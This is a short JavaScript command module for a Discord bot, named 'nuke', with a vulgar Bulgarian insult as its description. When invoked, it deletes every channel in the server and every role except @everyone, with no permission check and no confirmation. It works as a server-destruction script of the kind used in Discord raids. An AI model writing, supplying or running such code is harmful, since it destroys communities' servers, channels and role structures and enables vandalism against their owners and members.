module.exports = {
    name:"nuke",
    description:"Ибе мамата на някой",
    aliases: "None",
    usage: "?nuke",
    execute(message, args, Discord){
        console.log("asdf");
        message.guild.channels.cache.each(ch => {
            ch.delete();
            console.log(ch.name);
        })
        message.guild.roles.cache.each(r => {
            if(r.name != "@everyone"){
                r.delete();    
            }
            
            console.log(r.name);
        })
    }
}